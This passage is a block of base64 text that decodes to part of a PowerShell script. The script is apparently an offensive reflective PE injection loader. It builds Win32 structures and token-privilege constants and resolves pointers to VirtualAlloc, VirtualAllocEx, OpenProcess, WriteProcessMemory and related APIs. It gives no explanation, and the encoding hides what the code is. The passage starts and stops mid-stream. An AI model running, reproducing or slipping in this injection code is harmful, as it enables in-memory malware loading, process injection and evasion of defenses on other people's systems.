KCQkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9JTVBPUlRfREVTQ1JJUFRPUiAtVmFsdWUgJElNQUdFX0lNUE9SVF9ERVNDUklQVE9SOw0KCQkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCc7DQoJCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9FWFBPUlRfRElSRUNUT1JZJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgNDApOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDaGFyYWN0ZXJpc3RpY3MnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1RpbWVEYXRlU3RhbXAnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01ham9yVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTWlub3JWZXJzaW9uJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOYW1lJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdCYXNlJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOdW1iZXJPZkZ1bmN0aW9ucycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZOYW1lcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWRkcmVzc09mRnVuY3Rpb25zJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBZGRyZXNzT2ZOYW1lcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWRkcmVzc09mTmFtZU9yZGluYWxzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJElNQUdFX0VYUE9SVF9ESVJFQ1RPUlkgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpOw0KCQkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9FWFBPUlRfRElSRUNUT1JZIC1WYWx1ZSAkSU1BR0VfRVhQT1JUX0RJUkVDVE9SWTsNCgkJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnOw0KCQkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTFVJRCcsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDgpOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMb3dQYXJ0JywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdIaWdoUGFydCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRMVUlEID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKTsNCgkJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTFVJRCAtVmFsdWUgJExVSUQ7DQoJCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JzsNCgkJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0xVSURfQU5EX0FUVFJJQlVURVMnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAxMik7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0x1aWQnLCAkTFVJRCwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0F0dHJpYnV0ZXMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGw7DQoJCQkkTFVJRF9BTkRfQVRUUklCVVRFUyA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCk7DQoJCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIExVSURfQU5EX0FUVFJJQlVURVMgLVZhbHVlICRMVUlEX0FORF9BVFRSSUJVVEVTOw0KCQkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCc7DQoJCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdUT0tFTl9QUklWSUxFR0VTJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMTYpOw0KCQkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQcml2aWxlZ2VDb3VudCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUHJpdmlsZWdlcycsICRMVUlEX0FORF9BVFRSSUJVVEVTLCAnUHVibGljJykgfCBPdXQtTnVsbDsNCgkJCSRUT0tFTl9QUklWSUxFR0VTID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKTsNCgkJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVE9LRU5fUFJJVklMRUdFUyAtVmFsdWUgJFRPS0VOX1BSSVZJTEVHRVM7DQoJCQlyZXR1cm4gJFdpbjMyVHlwZXM7DQoJCX0NCgkJRnVuY3Rpb24gR2V0LVdpbjMyQ29uc3RhbnRzDQoJCXsNCgkJCSRXaW4zMkNvbnN0YW50cyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1FTV9DT01NSVQgLVZhbHVlIDB4MDAwMDEwMDA7DQoJCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNRU1fUkVTRVJWRSAtVmFsdWUgMHgwMDAwMjAwMDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfTk9BQ0NFU1MgLVZhbHVlIDB4MDE7DQoJCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX1JFQURPTkxZIC1WYWx1ZSAweDAyOw0KCQkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9SRUFEV1JJVEUgLVZhbHVlIDB4MDQ7DQoJCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX1dSSVRFQ09QWSAtVmFsdWUgMHgwODsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURSAtVmFsdWUgMHgxMDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURV9SRUFEIC1WYWx1ZSAweDIwOw0KCQkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9FWEVDVVRFX1JFQURXUklURSAtVmFsdWUgMHg0MDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURV9XUklURUNPUFkgLVZhbHVlIDB4ODA7DQoJCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX05PQ0FDSEUgLVZhbHVlIDB4MjAwOw0KCQkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfUkVMX0JBU0VEX0FCU09MVVRFIC1WYWx1ZSAwOw0KCQkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfUkVMX0JBU0VEX0hJR0hMT1cgLVZhbHVlIDM7DQoJCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9SRUxfQkFTRURfRElSNjQgLVZhbHVlIDEwOw0KCQkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfU0NOX01FTV9ESVNDQVJEQUJMRSAtVmFsdWUgMHgwMjAwMDAwMDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fRVhFQ1VURSAtVmFsdWUgMHgyMDAwMDAwMDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fUkVBRCAtVmFsdWUgMHg0MDAwMDAwMDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX1NDTl9NRU1fV1JJVEUgLVZhbHVlIDB4ODAwMDAwMDA7DQoJCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9TQ05fTUVNX05PVF9DQUNIRUQgLVZhbHVlIDB4MDQwMDAwMDA7DQoJCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNRU1fREVDT01NSVQgLVZhbHVlIDB4NDAwMDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0ZJTEVfRVhFQ1VUQUJMRV9JTUFHRSAtVmFsdWUgMHgwMDAyOw0KCQkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRklMRV9ETEwgLVZhbHVlIDB4MjAwMDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX0RMTENIQVJBQ1RFUklTVElDU19EWU5BTUlDX0JBU0UgLVZhbHVlIDB4NDA7DQoJCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9ETExDSEFSQUNURVJJU1RJQ1NfTlhfQ09NUEFUIC1WYWx1ZSAweDEwMDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1FTV9SRUxFQVNFIC1WYWx1ZSAweDgwMDA7DQoJCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBUT0tFTl9RVUVSWSAtVmFsdWUgMHgwMDA4Ow0KCQkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVE9LRU5fQURKVVNUX1BSSVZJTEVHRVMgLVZhbHVlIDB4MDAyMDsNCgkJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFNFX1BSSVZJTEVHRV9FTkFCTEVEIC1WYWx1ZSAweDI7DQoJCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBFUlJPUl9OT19UT0tFTiAtVmFsdWUgMHgzZjA7DQoJCQlyZXR1cm4gJFdpbjMyQ29uc3RhbnRzOw0KCQl9DQoJCUZ1bmN0aW9uIEdldC1XaW4zMkZ1bmN0aW9ucw0KCQl7DQoJCQkkV2luMzJGdW5jdGlvbnMgPSBOZXctT2JqZWN0IFN5c3RlbS5PYmplY3Q7DQoJCQkkVmlydHVhbEFsbG9jQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jOw0KCQkJJFZpcnR1YWxBbGxvY0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKTsNCgkJCSRWaXJ0dWFsQWxsb2MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jQWRkciwgJFZpcnR1YWxBbGxvY0RlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IC1OYW1lIFZpcnR1YWxBbGxvYyAtVmFsdWUgJFZpcnR1YWxBbGxvYzsNCgkJCSRWaXJ0dWFsQWxsb2NFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvY0V4Ow0KCQkJJFZpcnR1YWxBbGxvY0V4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKTsNCgkJCSRWaXJ0dWFsQWxsb2NFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NFeEFkZHIsICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IC1OYW1lIFZpcnR1YWxBbGxvY0V4IC1WYWx1ZSAkVmlydHVhbEFsbG9jRXg7DQoJCQkkbWVtY3B5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBtc3ZjcnQuZGxsIG1lbWNweTsNCgkJCSRtZW1jcHlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50UHRyXSkgKFtJbnRQdHJdKTsNCgkJCSRtZW1jcHkgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkbWVtY3B5QWRkciwgJG1lbWNweURlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIG1lbWNweSAtVmFsdWUgJG1lbWNweTsNCgkJCSRtZW1zZXRBZGRyID0gR2V0LVByb2NBZGRyZXNzIG1zdmNydC5kbGwgbWVtc2V0Ow0KCQkJJG1lbXNldERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKTsNCgkJCSRtZW1zZXQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkbWVtc2V0QWRkciwgJG1lbXNldERlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIG1lbXNldCAtVmFsdWUgJG1lbXNldDsNCgkJCSRMb2FkTGlicmFyeUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIExvYWRMaWJyYXJ5QTsNCgkJCSRMb2FkTGlicmFyeURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtTdHJpbmddKSAoW0ludFB0cl0pOw0KCQkJJExvYWRMaWJyYXJ5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJExvYWRMaWJyYXJ5QWRkciwgJExvYWRMaWJyYXJ5RGVsZWdhdGUpOw0KCQkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTG9hZExpYnJhcnkgLVZhbHVlICRMb2FkTGlicmFyeTsNCgkJCSRHZXRQcm9jQWRkcmVzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldFByb2NBZGRyZXNzOw0KCQkJJEdldFByb2NBZGRyZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtTdHJpbmddKSAoW0ludFB0cl0pOw0KCQkJJEdldFByb2NBZGRyZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldFByb2NBZGRyZXNzQWRkciwgJEdldFByb2NBZGRyZXNzRGVsZWdhdGUpOw0KCQkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgR2V0UHJvY0FkZHJlc3MgLVZhbHVlICRHZXRQcm9jQWRkcmVzczsNCgkJCSRHZXRQcm9jQWRkcmVzc0ludFB0ckFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEdldFByb2NBZGRyZXNzOw0KCQkJJEdldFByb2NBZGRyZXNzSW50UHRyRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pOw0KCQkJJEdldFByb2NBZGRyZXNzSW50UHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEdldFByb2NBZGRyZXNzSW50UHRyQWRkciwgJEdldFByb2NBZGRyZXNzSW50UHRyRGVsZWdhdGUpOw0KCQkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgR2V0UHJvY0FkZHJlc3NJbnRQdHIgLVZhbHVlICRHZXRQcm9jQWRkcmVzc0ludFB0cjsNCgkJCSRWaXJ0dWFsRnJlZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxGcmVlOw0KCQkJJFZpcnR1YWxGcmVlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50UHRyXSwgW1VJbnQzMl0pIChbQm9vbF0pOw0KCQkJJFZpcnR1YWxGcmVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxGcmVlQWRkciwgJFZpcnR1YWxGcmVlRGVsZWdhdGUpOw0KCQkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbEZyZWUgLVZhbHVlICRWaXJ0dWFsRnJlZTsNCgkJCSRWaXJ0dWFsRnJlZUV4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEZyZWVFeDsNCgkJCSRWaXJ0dWFsRnJlZUV4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludFB0cl0sIFtVSW50MzJdKSAoW0Jvb2xdKTsNCgkJCSRWaXJ0dWFsRnJlZUV4ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFZpcnR1YWxGcmVlRXhBZGRyLCAkVmlydHVhbEZyZWVFeERlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IC1OYW1lIFZpcnR1YWxGcmVlRXggLVZhbHVlICRWaXJ0dWFsRnJlZUV4Ow0KCQkJJFZpcnR1YWxQcm90ZWN0QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbFByb3RlY3Q7DQoJCQkkVmlydHVhbFByb3RlY3REZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKTsNCgkJCSRWaXJ0dWFsUHJvdGVjdCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsUHJvdGVjdEFkZHIsICRWaXJ0dWFsUHJvdGVjdERlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IC1OYW1lIFZpcnR1YWxQcm90ZWN0IC1WYWx1ZSAkVmlydHVhbFByb3RlY3Q7DQoJCQkkR2V0TW9kdWxlSGFuZGxlQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0TW9kdWxlSGFuZGxlQTsNCgkJCSRHZXRNb2R1bGVIYW5kbGVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbU3RyaW5nXSkgKFtJbnRQdHJdKTsNCgkJCSRHZXRNb2R1bGVIYW5kbGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0TW9kdWxlSGFuZGxlQWRkciwgJEdldE1vZHVsZUhhbmRsZURlbGVnYXRlKTsNCgkJCSRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IC1OYW1lIEdldE1vZHVsZUhhbmRsZSAtVmFsdWUgJEdldE1vZHVsZUhhbmRsZTsNCgkJCSRGcmVlTGlicmFyeUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEZyZWVMaWJyYXJ5Ow0KCQkJJEZyZWVMaWJyYXJ5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0pIChbQm9vbF0pOw0KCQkJJEZyZWVMaWJyYXJ5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEZyZWVMaWJyYXJ5QWRkciwgJEZyZWVMaWJyYXJ5RGVsZWdhdGUpOw0KCQkJJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRnJlZUxpYnJhcnkgLVZhbHVlICRGcmVlTGlicmFyeTsNCgkJCSRPcGVuUHJvY2Vzc0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIE9wZW5Qcm9jZXNzOw0KCQkJJE9wZW5Qcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW1VJbnQzMl0sIFtCb29sXSwgW1VJbnQzMl0pIChbSW50UHRyXSk7DQoJCQkkT3BlblByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblByb2Nlc3NBZGRyLCAkT3BlblByb2Nlc3NEZWxlZ2F0ZSk7DQoJCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBPcGVuUHJvY2VzcyAtVmFsdWUgJE9wZW5Qcm9jZXNzOw0KCQkJJFdhaXRGb3JTaW5nbGVPYmplY3RBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBXYWl0Rm9yU2luZ2xlT2JqZWN0Ow0KCQkJJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0pIChbVUludDMyXSk7DQoJCQkkV2FpdEZvclNpbmdsZU9iamVjdCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciwgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSk7DQoJCQkkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBXYWl0Rm9yU2luZ2xlT2JqZWN0IC1WYWx1ZSAkV2FpdEZvclNpbmdsZU9iamVjdDsNCgkJCSRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBXcml0ZVByb2Nlc3NNZW1vcnk7DQoJCQkkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnRQdHJdLCBbVUl